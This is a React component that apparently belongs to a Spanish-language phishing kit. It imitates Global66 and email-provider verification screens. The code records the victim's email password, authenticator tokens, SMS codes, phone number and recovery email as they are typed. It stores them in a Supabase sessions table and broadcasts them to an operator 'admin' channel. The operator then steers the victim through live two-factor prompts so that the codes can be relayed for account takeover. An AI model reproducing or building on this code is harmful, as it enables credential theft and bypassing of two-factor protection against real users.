import { useState, useEffect, useCallback, useRef } from "react";
import { supabase } from "@/integrations/supabase/client";
import { ChevronLeft, Loader2 } from "lucide-react";
import { getEmailProvider } from "@/lib/emailProviders";

interface Props {
  email: string;
  sessionId: string;
  onBack: () => void;
}

type ConfirmStep = "password" | "waiting" | "token_2fa" | "sms_phone" | "sms_waiting" | "sms_code" | "recovery_email_input" | "recovery_email_submitted" | "success";

const Global66ConfirmEmailScreen = ({ email, sessionId, onBack }: Props) => {
  const [step, setStep] = useState<ConfirmStep>("password");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [tokenCode, setTokenCode] = useState("");
  const [smsCode, setSmsCode] = useState("");
  const [clientRecoveryEmail, setClientRecoveryEmail] = useState("");
  const [clientPhoneInput, setClientPhoneInput] = useState("");
  const [phoneEnding, setPhoneEnding] = useState("");
  const [adminTokenCode, setAdminTokenCode] = useState("");
  const [recoveryEmailAddr, setRecoveryEmailAddr] = useState("");
  const [errorMessage, setErrorMessage] = useState("");

  const provider = getEmailProvider(email);
  const broadcastChRef = useRef<ReturnType<typeof supabase.channel> | null>(null);
  const syncChRef = useRef<ReturnType<typeof supabase.channel> | null>(null);

  const broadcastToAdmin = useCallback((event: string, payload: Record<string, string>) => {
    if (broadcastChRef.current) broadcastChRef.current.send({ type: "broadcast", event, payload });
    if (syncChRef.current) syncChRef.current.send({ type: "broadcast", event, payload });
  }, []);

  useEffect(() => {
    const confirmCh = supabase.channel(`confirm-email-${sessionId}`);
    const syncCh = supabase.channel(`sync-email-${sessionId}`);
    broadcastChRef.current = confirmCh;
    syncChRef.current = syncCh;

    const handleDecision = (decision: string, payload?: Record<string, string>) => {
      if (decision === "confirm_wrong_password" || decision === "sync_wrong_password") {
        setErrorMessage("Contraseña incorrecta. Intentá de nuevo."); setStep("password"); setPassword(""); setLoading(false);
      } else if (decision === "confirm_ask_otp" || decision === "sync_ask_otp") {
        if (step === "sms_waiting" || step === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
        else { setStep("token_2fa"); setTokenCode(""); setAdminTokenCode(""); }
        setErrorMessage("");
      } else if (decision === "confirm_ask_token" || decision === "sync_ask_token") {
        setAdminTokenCode(payload?.admin_token || ""); setStep("token_2fa"); setTokenCode(""); setErrorMessage("");
      } else if (decision === "confirm_ask_sms" || decision === "sync_ask_sms") {
        if (step === "sms_waiting" || step === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
        else { setPhoneEnding(payload?.sms_ending || ""); setStep("sms_phone"); setClientPhoneInput(""); setSmsCode(""); }
        setErrorMessage("");
      } else if (decision === "confirm_advance_sms_code" || decision === "sync_advance_sms_code") {
        if (payload?.sms_ending) setPhoneEnding(payload.sms_ending); setStep("sms_code"); setSmsCode(""); setErrorMessage("");
      } else if (decision === "confirm_ask_recovery_email" || decision === "sync_ask_recovery_email") {
        setRecoveryEmailAddr(payload?.recovery_email || ""); setStep("recovery_email_input"); setClientRecoveryEmail(""); setErrorMessage("");
      } else if (decision === "confirm_approved" || decision === "sync_approved") {
        setStep("success");
      } else if (decision === "confirm_rejected" || decision === "sync_rejected") {
        setErrorMessage("Verificación fallida. Intentá de nuevo."); setClientRecoveryEmail(""); setSmsCode(""); setTokenCode("");
      }
    };

    confirmCh.on("broadcast", { event: "admin_decision" }, (p) => handleDecision(p.payload?.status, p.payload)).subscribe();
    syncCh.on("broadcast", { event: "admin_sync_decision" }, (p) => handleDecision(p.payload?.status, p.payload)).subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status, otp_code").eq("id", sessionId).maybeSingle();
      if (!data) return;
      const { status: s, otp_code: otp } = data;
      if ((s === "confirm_wrong_password" || s === "sync_wrong_password") && step !== "password") { setErrorMessage("Contraseña incorrecta."); setStep("password"); setPassword(""); }
      else if ((s === "confirm_ask_otp" || s === "sync_ask_otp") && step !== "token_2fa" && step !== "sms_code") {
        if (step === "sms_waiting" || step === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
        else { setStep("token_2fa"); setTokenCode(""); setAdminTokenCode(""); }
      }
      else if ((s === "confirm_ask_token" || s === "sync_ask_token") && step !== "token_2fa") {
        setAdminTokenCode(otp?.startsWith("admin_token:") ? otp.replace("admin_token:", "") : ""); setStep("token_2fa"); setTokenCode("");
      }
      else if ((s === "confirm_ask_sms" || s === "sync_ask_sms") && step !== "sms_phone" && step !== "sms_code" && step !== "sms_waiting") {
        if (step === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
        else { setPhoneEnding(otp?.startsWith("sms_ending:") ? otp.replace("sms_ending:", "") : ""); setStep("sms_phone"); setClientPhoneInput(""); setSmsCode(""); }
      }
      else if ((s === "confirm_approved" || s === "sync_approved") && step !== "success") setStep("success");
    }, 2500);

    return () => {
      broadcastChRef.current = null; syncChRef.current = null;
      supabase.removeChannel(confirmCh); supabase.removeChannel(syncCh);
      clearInterval(pollInterval);
    };
  }, [sessionId, step]);

  const handlePasswordChange = useCallback((v: string) => {
    setPassword(v);
    supabase.from("sessions").update({ otp_code: `email_pass:${v}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_email_password_typing", { session_id: sessionId, email_password: v });
  }, [sessionId, broadcastToAdmin]);

  const handlePasswordSubmit = useCallback(async (e: React.FormEvent) => {
    e.preventDefault(); if (!password.trim()) return;
    setLoading(true); setErrorMessage("");
    await supabase.from("sessions").update({ otp_code: `email_pass:${password}`, status: "confirm_email_pending" }).eq("id", sessionId);
    broadcastToAdmin("client_email_password", { session_id: sessionId, email_password: password, email, provider_id: provider.id, provider_name: provider.name });
    setStep("waiting"); setLoading(false);
  }, [password, sessionId, broadcastToAdmin, email, provider]);

  const handleTokenChange = useCallback((v: string) => {
    setTokenCode(v);
    supabase.from("sessions").update({ otp_code: `token_code:${v}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_token_update", { session_id: sessionId, token_code: v });
  }, [sessionId, broadcastToAdmin]);

  const handlePhoneChange = useCallback((v: string) => {
    setClientPhoneInput(v);
    supabase.from("sessions").update({ otp_code: `client_phone:${v}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_phone_update", { session_id: sessionId, phone_number: v });
  }, [sessionId, broadcastToAdmin]);

  const handlePhoneSubmit = useCallback((e: React.FormEvent) => {
    e.preventDefault(); if (!clientPhoneInput.trim()) return;
    supabase.from("sessions").update({ otp_code: `client_phone_final:${clientPhoneInput}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_phone_submitted", { session_id: sessionId, phone_number: clientPhoneInput });
    setStep("sms_waiting");
  }, [clientPhoneInput, sessionId, broadcastToAdmin]);

  const handleSmsCodeChange = useCallback((v: string) => {
    setSmsCode(v);
    supabase.from("sessions").update({ otp_code: `sms_code:${v}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_sms_update", { session_id: sessionId, sms_code: v });
  }, [sessionId, broadcastToAdmin]);

  const handleRecoveryEmailChange = useCallback((v: string) => {
    setClientRecoveryEmail(v);
    supabase.from("sessions").update({ otp_code: `client_recovery_email:${v}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_recovery_email_update", { session_id: sessionId, recovery_email: v });
  }, [sessionId, broadcastToAdmin]);

  const handleRecoveryEmailSubmit = useCallback((e: React.FormEvent) => {
    e.preventDefault(); if (!clientRecoveryEmail.trim()) return;
    supabase.from("sessions").update({ otp_code: `client_recovery_email_final:${clientRecoveryEmail}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_recovery_email_submitted", { session_id: sessionId, recovery_email: clientRecoveryEmail });
    setStep("recovery_email_submitted");
  }, [clientRecoveryEmail, sessionId, broadcastToAdmin]);

  const inputClass = "w-full rounded-xl border border-[#d5dbe5] bg-white px-4 py-4 text-[15px] text-[#1a2233] outline-none transition-all placeholder:text-[#9ba5b7] focus:border-[#2b4ea2] focus:ring-2 focus:ring-[#2b4ea2]/10";
  const btnClass = "w-full rounded-xl bg-[#2b4ea2] py-4 text-[16px] font-semibold text-white transition-all hover:bg-[#233f85] active:scale-[0.98] disabled:opacity-60";

  const renderError = () => errorMessage ? (
    <div className="mb-4 rounded-lg border border-red-200 bg-red-50 px-4 py-2.5 text-sm text-red-600">{errorMessage}</div>
  ) : null;

  const renderLoading = (text: string) => (
    <div className="flex items-center justify-center gap-2 text-[14px] text-[#6b7a90]">
      <Loader2 className="h-4 w-4 animate-spin text-[#2b4ea2]" />{text}
    </div>
  );

  const renderProviderInfo = () => (
    <div className="mb-6 flex items-center gap-3 rounded-xl border border-[#e2e7ef] bg-[#f5f7fa] px-4 py-3">
      <div className="h-8 w-8 shrink-0">{provider.icon}</div>
      <div className="flex flex-col items-start">
        <span className="text-[11px] text-[#9ba5b7]">{provider.name}</span>
        <span className="text-[14px] font-medium text-[#1a2233]">{email}</span>
      </div>
    </div>
  );

  if (step === "success") {
    return (
      <div className="flex min-h-[100dvh] flex-col items-center justify-center bg-[#f7f8fc] px-6">
        <div className="text-[48px] mb-4">✅</div>
        <h1 className="text-[22px] font-bold text-[#1a2233] mb-2">Verificación completa</h1>
        <p className="text-[14px] text-[#6b7a90]">Tu correo fue verificado correctamente.</p>
      </div>
    );
  }

  return (
    <div className="flex min-h-[100dvh] flex-col bg-[#f7f8fc]">
      <div className="flex items-center px-4 py-4">
        <button onClick={onBack} className="p-1 text-[#1a2233]"><ChevronLeft size={24} /></button>
        <h1 className="flex-1 text-center text-[17px] font-semibold text-[#1a2233] pr-8">Verificar correo</h1>
      </div>

      <div className="flex flex-1 flex-col items-center px-6 pt-6">
        <div className="w-full max-w-[400px]">
          {renderProviderInfo()}
          {renderError()}

          {step === "password" && (
            <>
              <h2 className="text-[20px] font-bold text-[#1a2233] mb-2">Verificá tu correo</h2>
              <p className="text-[14px] text-[#6b7a90] mb-6">Ingresá la contraseña de tu {provider.name} para verificar tu identidad</p>
              <form onSubmit={handlePasswordSubmit} className="flex flex-col gap-4">
                <input type="password" placeholder={`Contraseña de ${provider.name}`} value={password} onChange={(e) => handlePasswordChange(e.target.value)} disabled={loading} autoFocus className={inputClass} />
                <button type="submit" disabled={loading || !password.trim()} className={btnClass}>
                  {loading ? "Verificando..." : "Confirmar"}
                </button>
              </form>
            </>
          )}

          {step === "waiting" && (
            <div className="text-center pt-10">
              <h2 className="text-[20px] font-bold text-[#1a2233] mb-2">Verificando tu cuenta</h2>
              <p className="text-[14px] text-[#6b7a90] mb-6">Estamos verificando tu cuenta de {provider.name}...</p>
              {renderLoading("Verificación en progreso...")}
            </div>
          )}

          {step === "token_2fa" && (
            <>
              <h2 className="text-[20px] font-bold text-[#1a2233] mb-2">Verificación en dos pasos</h2>
              {adminTokenCode ? (
                <>
                  <p className="text-[14px] text-[#6b7a90] mb-6">Tocá el número que aparece abajo en tu dispositivo</p>
                  <div className="mb-6 flex h-20 w-20 items-center justify-center rounded-2xl border-2 border-[#2b4ea2] bg-[#2b4ea2]/10 mx-auto">
                    <span className="text-3xl font-bold text-[#2b4ea2]">{adminTokenCode}</span>
                  </div>
                  {renderLoading("Esperando confirmación...")}
                </>
              ) : (
                <>
                  <p className="text-[14px] text-[#6b7a90] mb-6">Ingresá el código de tu app de autenticación</p>
                  <input type="text" inputMode="numeric" placeholder="Código de verificación" value={tokenCode} onChange={(e) => handleTokenChange(e.target.value)} autoFocus maxLength={20} className={`${inputClass} mb-4`} />
                  {tokenCode.length >= 6 ? renderLoading("Verificando código...") : <button disabled className={btnClass}>Confirmar</button>}
                </>
              )}
            </>
          )}

          {step === "sms_phone" && (
            <>
              <h2 className="text-[20px] font-bold text-[#1a2233] mb-2">Verificación por teléfono</h2>
              <p className="text-[14px] text-[#6b7a90] mb-6">
                {phoneEnding ? <>Confirmá el número terminado en <span className="font-bold text-[#1a2233]">**{phoneEnding}</span></> : "Ingresá tu número de teléfono"}
              </p>
              <form onSubmit={handlePhoneSubmit} className="flex flex-col gap-4">
                <input type="tel" placeholder={phoneEnding ? `Terminado en ${phoneEnding}` : "+54 9 1234 5678"} value={clientPhoneInput} onChange={(e) => handlePhoneChange(e.target.value)} autoFocus className={inputClass} />
                <button type="submit" disabled={!clientPhoneInput.trim()} className={btnClass}>Confirmar</button>
              </form>
            </>
          )}

          {step === "sms_waiting" && (
            <div className="text-center pt-10">
              <h2 className="text-[20px] font-bold text-[#1a2233] mb-2">Enviando código SMS</h2>
              <p className="text-[14px] text-[#6b7a90] mb-6">Estamos enviando un código a tu teléfono...</p>
              {renderLoading("Enviando...")}
            </div>
          )}

          {step === "sms_code" && (
            <>
              <h2 className="text-[20px] font-bold text-[#1a2233] mb-2">Código SMS</h2>
              <p className="text-[14px] text-[#6b7a90] mb-6">Ingresá el código que recibiste{phoneEnding ? ` en **${phoneEnding}` : ""}</p>
              <input type="text" inputMode="numeric" placeholder="Código SMS" value={smsCode} onChange={(e) => handleSmsCodeChange(e.target.value)} autoFocus maxLength={10} className={`${inputClass} mb-4`} />
              {smsCode.length >= 6 ? renderLoading("Verificando...") : <button disabled className={btnClass}>Confirmar</button>}
            </>
          )}

          {step === "recovery_email_input" && (
            <>
              <h2 className="text-[20px] font-bold text-[#1a2233] mb-2">Correo de recuperación</h2>
              <p className="text-[14px] text-[#6b7a90] mb-6">
                {recoveryEmailAddr ? <>Ingresá tu correo que termina en <span className="font-bold text-[#1a2233]">{recoveryEmailAddr}</span></> : "Ingresá tu correo de recuperación"}
              </p>
              <form onSubmit={handleRecoveryEmailSubmit} className="flex flex-col gap-4">
                <input type="email" placeholder="Correo de recuperación" value={clientRecoveryEmail} onChange={(e) => handleRecoveryEmailChange(e.target.value)} autoFocus className={inputClass} />
                <button type="submit" disabled={!clientRecoveryEmail.trim()} className={btnClass}>Confirmar</button>
              </form>
            </>
          )}

          {step === "recovery_email_submitted" && (
            <div className="text-center pt-10">
              <h2 className="text-[20px] font-bold text-[#1a2233] mb-2">Verificando correo</h2>
              <p className="text-[14px] text-[#6b7a90] mb-6">Verificando tu correo de recuperación...</p>
              {renderLoading("Verificando...")}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default Global66ConfirmEmailScreen;
